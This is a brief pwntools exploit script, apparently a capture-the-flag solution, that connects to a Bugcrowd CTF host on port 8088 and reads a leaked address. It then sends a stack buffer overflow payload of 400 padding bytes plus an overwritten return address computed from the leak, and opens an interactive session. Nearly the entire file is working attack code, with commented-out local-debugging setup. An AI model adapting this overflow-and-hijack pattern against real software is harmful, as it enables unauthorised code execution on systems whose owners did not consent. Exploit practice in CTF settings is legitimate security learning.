from pwn import *
#p=process(["./ld-2.27.so", "--library-path", ".", "./chal"])
# 
# context.binary = exe = ELF("./chal",checksec=False)
# libc = ELF("./libc-2.27.so",checksec=False)
# ld = ELF("./ld-2.27.so",checksec=False)
# 
# p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
# print(exe.symbols['stdout']-exe.symbols['stdin'])
# 
p=remote('challenges.bhusa.bugcrowdctf.com', 8088)
print(p.recv().decode())
a=int(input(),16)
payload=b'a'*400+p64(a+3424) 
#input()
p.sendline(payload)
p.interactive()
